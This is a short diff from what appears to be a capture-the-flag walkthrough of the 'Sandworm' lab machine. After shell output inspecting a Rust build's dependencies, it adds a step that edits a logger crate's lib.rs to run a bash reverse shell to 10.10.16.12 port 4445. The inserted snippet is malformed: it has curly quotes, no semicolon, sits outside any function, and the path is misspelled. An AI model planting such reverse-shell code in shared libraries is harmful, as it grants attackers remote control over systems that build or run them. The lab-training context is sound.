@@ -134,4 +134,15 @@ cat admin.json
 silentobserver@sandworm:/opt/tipnet/target/debug$ cat tipnet.d
 /opt/tipnet/target/debug/tipnet: /opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs
 ```
+nano /opt/crates/loggger/src/lib.rs
 
+use std::process::Command;
+
+let output = Command::new(“bash”)
+        .arg(“-c”)
+        .arg("bash -i >& /dev/tcp/10.10.16.12/4445 0>&1")
+        .output()
+        .expect(“failed to execute process”)
+
+
+ 
